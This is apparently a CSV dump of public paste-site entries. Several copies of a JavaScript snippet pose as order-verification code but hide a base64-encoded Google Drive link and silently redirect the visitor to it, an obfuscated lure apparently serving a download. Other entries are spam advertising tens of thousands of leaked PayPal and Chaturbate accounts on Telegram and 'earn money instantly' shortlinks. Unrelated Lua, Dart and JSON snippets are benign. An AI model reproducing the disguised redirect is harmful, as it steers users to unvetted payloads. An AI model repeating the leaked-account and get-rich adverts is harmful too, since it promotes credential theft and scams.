id,title,username,language,date,content
V3a9vxkX,Untitled,luqlegal,JavaScript,Monday 28th of April 2025 06:30:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26216/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iu2J1MN0,EARN $900 INSTANTLY 2025 95,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:22:18 AM CDT," 
Pdf https://tinyurl.com/freshleaks

jlwwn0GvH3
"
VZbreGFj,PayPal with Balance,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:16:14 AM CDT,53521 Accounts Posted On https://t.me/leakedbyem1nem
GSncqsVC,Products.js,luqlegal,JavaScript,Monday 28th of April 2025 06:14:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94825/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MEC9HzdR,Make $1000 15-MINUTES (BEGINNER) L4,KRATOSPASTEBIN2,JavaScript,Monday 28th of April 2025 06:13:05 AM CDT," 
Pdf https://tinyurl.com/freshleaks

vSoJfBzykL
"
dTh5xQQv,Fixed Daily Rewards Server Script,Cakey3101,Lua,Monday 28th of April 2025 06:10:53 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local Remotes = ReplicatedStorage.Remotes
local DailyRewardConfig = require(ReplicatedStorage.DailyRewards)

local function ClaimReward(Player: Player, Day: number)
	local DailyRewardsStat = Player:FindFirstChild(""DailyReward"")
	local LastCollectTimeStat = Player:FindFirstChild(""LastCollectTime"")
	local Leaderstats = Player:FindFirstChild(""leaderstats"")
	
	local CurrentDay = DailyRewardsStat.Value
	local LastCollectTime = LastCollectTimeStat.Value
	local CurrentTime = os.time()
	
	if CurrentDay ~= Day then return end
	if LastCollectTime ~= 0 and CurrentTime - LastCollectTime < 24 * 60 * 60 then return end
	
	local Reward = DailyRewardConfig[tostring(Day)]
	if not Reward then return end
	
	local RewardStat = Leaderstats:FindFirstChild(Reward.Type)
	if RewardStat and RewardStat:IsA(""NumberValue"") then
		RewardStat.Value += Reward.Amount
		print(""Reward Claimed!"")
	end
	
	LastCollectTimeStat.Value = CurrentTime
	DailyRewardsStat.Value = CurrentDay + 1
	
	Remotes.ClaimDailyReward:FireClient(Player)
end

Remotes.ClaimDailyReward.OnServerEvent:Connect(ClaimReward)"
AEzaW0hs,card flutter,muhaiminurabir,Dart,Monday 28th of April 2025 06:06:23 AM CDT,"Card(
                            color: ProjectColors.gray8,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.all(
                                Radius.circular(10),
                              ),
                            ),
                            child: Padding(
                              padding: EdgeInsets.all(5),
                              child: Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Text(
                                    context
                                        .read<FarmProvider>()
                                        .activeFarms!
                                        .orders!
                                        .data![position]
                                        .attributes
                                        ?.totalReturn ??
                                        """",
                                    style: GoogleFonts.poppins(
                                      fontSize: 8.0,
                                      fontWeight: FontWeight.w400,
                                      color: ProjectColors.black,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                  Padding(
                                    padding: EdgeInsets.fromLTRB(5, 0, 5, 0),
                                    child: SizedBox(
                                      height: 7,
                                      child: Container(
                                        width: 1,
                                        height: 5,
                                        color: Color(0xFFD1D1D1),
                                      ),
                                    ),
                                  ),
                                  Text(
                                    context
                                        .read<FarmProvider>()
                                        .activeFarms!
                                        .orders!
                                        .data![position]
                                        .attributes
                                        ?.farm
                                        ?.duration ??
                                        """",
                                    style: GoogleFonts.poppins(
                                      fontSize: 8.0,
                                      fontWeight: FontWeight.w400,
                                      color: ProjectColors.black,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                ],
                              ),
                            ),
                          )"
NjnRgVtC,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 28th of April 2025 06:00:52 AM CDT,36008 Accounts Posted On https://t.me/leakedbyem1nem
A4jT0hQQ,dataNone,TestGuy1,JSON,Monday 28th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f8762f1f703610484cac9c58e880af78d8763a508b42c6be29b737e83ffa185fb4fea187c335e34b4021927903d851c0a10e85ca4c12c93f45c3644136a9b96820f838c280c935eca2241b23c2db4dadc47754241dd495119510b3bb261ebee75b218527471486a2ffcf78b25265b78b63417ed83064d92f88b036ea5767628e',
  otherdata: [
    '754ddfc8b430a3c09d8851515cfc8dea',
    '6907ddb57bc101231821b233e23f89c7',
    'd941ea05366dd1113a0d21ead1e60bdf',
    'c09bbe4fb113ac13b5f970813bedfd92',
    '632a9dff34156b190e3833c912f37eb5',
    '6294ce21c23dea22dbb1a8416808c224',
    '64ba72ced74c86ae33516c98310b2c0f',
    '06800ce16a256b6d11983a938148b98f'
  ]
}"
7jKBvcEW,Order.js,luqlegal,JavaScript,Monday 28th of April 2025 05:59:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02091/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hUUZ83Gk,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 28th of April 2025 05:45:31 AM CDT,11329 Accounts Posted On https://t.me/leakedbyem1nem
xdq6tgc1,Market.js,luqlegal,JavaScript,Monday 28th of April 2025 05:44:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30088/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
